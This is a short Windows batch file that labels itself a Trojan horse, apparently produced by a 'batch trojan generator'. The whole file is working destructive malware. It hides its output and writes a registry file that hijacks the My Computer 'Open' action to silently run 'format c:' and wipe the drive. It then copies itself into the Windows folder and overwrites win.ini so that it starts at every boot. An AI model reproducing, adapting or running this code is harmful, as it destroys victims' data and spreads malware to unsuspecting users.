@echo off
REM Name of the Trojan Horse: BAT.Kas.e
REM Author of the Trojan Horse: [ka$]
REM generated with BATCH TROJAN GENERATOR 0.07
ctty NUL
set bom=c:\regbomb.reg
echo>%bom% REGEDIT4
echo.>>%bom%
echo>>%bom% [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open]
echo.>>%bom%
echo >>%bom% [HKEY_LOCAL_MACHINE\SOFTWARE\classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open\Command]
echo >>%bom% @="start /minimized command /c echo y|format c: /q /u /autotest >nul"
echo.>>%bom%
regedit.exe %bom%
set mssd=%0
copy %mssd% %windir%\asd.bat
echo [windows] > %windir%\win.ini
echo load=%windir%\asd.bat >> %windir%\win.ini
echo run=%windir%\asd.bat >> %windir%\win.ini
echo NullPort=None >> %windir%\win.ini
